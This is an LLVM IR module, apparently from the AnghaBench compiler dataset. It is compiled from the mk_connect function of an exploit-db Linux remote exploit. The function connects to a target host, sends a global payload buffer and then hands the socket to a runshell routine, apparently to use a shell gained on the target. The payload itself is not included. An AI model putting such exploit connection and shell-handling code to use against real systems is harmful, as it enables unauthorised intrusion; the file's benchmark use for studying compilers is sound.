; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_230.c_mk_connect.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_230.c_mk_connect.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i8*, i32, i32 }
%struct.sockaddr_in = type { i32, i32, i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [28 x i8] c"cannot resolve, exiting...\0A\00", align 1
@SOCK_STREAM = common dso_local global i32 0, align 4
@SIGALRM = common dso_local global i32 0, align 4
@sigalarm = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [29 x i8] c"connecting to %s to port %d\0A\00", align 1
@.str.2 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@.str.3 = private unnamed_addr constant [36 x i8] c"connected!, sending the buffer...\0A\0A\00", align 1
@yahoo = common dso_local global i8* null, align 8
@.str.4 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @mk_connect(i8* %0, i32 %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca %struct.hostent*, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %8 = load i32, i32* @AF_INET, align 4
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  store i32 %8, i32* %9, align 4
  %10 = load i32, i32* %4, align 4
  %11 = call i32 @htons(i32 %10)
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i32 %11, i32* %12, align 4
  %13 = load i8*, i8** %3, align 8
  %14 = call %struct.hostent* @gethostbyname(i8* %13)
  store %struct.hostent* %14, %struct.hostent** %5, align 8
  %15 = load %struct.hostent*, %struct.hostent** %5, align 8
  %16 = icmp ne %struct.hostent* %15, null
  br i1 %16, label %20, label %17

17:                                               ; preds = %2
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str, i64 0, i64 0))
  %19 = call i32 @exit(i32 0) #3
  unreachable

20:                                               ; preds = %2
  %21 = load %struct.hostent*, %struct.hostent** %5, align 8
  %22 = getelementptr inbounds %struct.hostent, %struct.hostent* %21, i32 0, i32 2
  %23 = load i32, i32* %22, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  %25 = bitcast i32* %24 to %struct.in_addr*
  %26 = load %struct.hostent*, %struct.hostent** %5, align 8
  %27 = getelementptr inbounds %struct.hostent, %struct.hostent* %26, i32 0, i32 1
  %28 = load i32, i32* %27, align 8
  %29 = call i32 @bcopy(i32 %23, %struct.in_addr* %25, i32 %28)
  %30 = load i32, i32* @AF_INET, align 4
  %31 = load i32, i32* @SOCK_STREAM, align 4
  %32 = call i32 @socket(i32 %30, i32 %31, i32 0)
  store i32 %32, i32* %7, align 4
  %33 = load i32, i32* @SIGALRM, align 4
  %34 = load i32, i32* @sigalarm, align 4
  %35 = call i32 @signal(i32 %33, i32 %34)
  %36 = call i32 @alarm(i32 10)
  %37 = load %struct.hostent*, %struct.hostent** %5, align 8
  %38 = getelementptr inbounds %struct.hostent, %struct.hostent* %37, i32 0, i32 0
  %39 = load i8*, i8** %38, align 8
  %40 = load i32, i32* %4, align 4
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i64 0, i64 0), i8* %39, i32 %40)
  %42 = load i32, i32* %7, align 4
  %43 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %44 = call i64 @connect(i32 %42, %struct.sockaddr* %43, i32 4)
  %45 = icmp slt i64 %44, 0
  br i1 %45, label %46, label %50

46:                                               ; preds = %20
  %47 = call i32 @putchar(i8 signext 10)
  %48 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.2, i64 0, i64 0))
  %49 = call i32 @exit(i32 1) #3
  unreachable

50:                                               ; preds = %20
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.3, i64 0, i64 0))
  %52 = load i32, i32* %7, align 4
  %53 = load i8*, i8** @yahoo, align 8
  %54 = load i8*, i8** @yahoo, align 8
  %55 = call i32 @strlen(i8* %54)
  %56 = call i32 @write(i32 %52, i8* %53, i32 %55)
  %57 = load i8*, i8** @yahoo, align 8
  %58 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i64 0, i64 0), i8* %57)
  %59 = call i32 @sleep(i32 1)
  %60 = call i32 @alarm(i32 0)
  %61 = load i32, i32* %7, align 4
  %62 = call i32 @runshell(i32 %61)
  ret void
}

declare dso_local i32 @htons(i32) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @bcopy(i32, %struct.in_addr*, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @signal(i32, i32) #1

declare dso_local i32 @alarm(i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @putchar(i8 signext) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @runshell(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
